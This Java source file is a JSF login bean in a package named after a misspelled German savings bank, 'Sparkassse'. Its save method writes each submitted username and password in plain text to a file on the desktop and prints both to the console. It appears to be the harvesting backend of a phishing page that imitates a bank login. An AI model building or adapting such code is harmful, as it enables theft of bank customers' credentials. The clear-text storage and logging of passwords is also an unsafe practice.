package Sparkassse;

import javax.faces.bean.ManagedBean;
import javax.faces.bean.RequestScoped;
import javax.faces.bean.SessionScoped;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

@RequestScoped
@ManagedBean
public class Login {

    public String username;
    public String password;

    public void save() throws IOException {
        File file = new File(System.getProperty("user.home") + "/Desktop/deineMama.xyz");
        FileWriter fileWriter = null;
        fileWriter = new FileWriter(file);
        fileWriter.append("username: " + getUsername() + "\npassword: " + getPassword() + "\n");
        fileWriter.flush();
        fileWriter.close();
        System.out.println(getUsername());
        System.out.println(getPassword());
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }
}
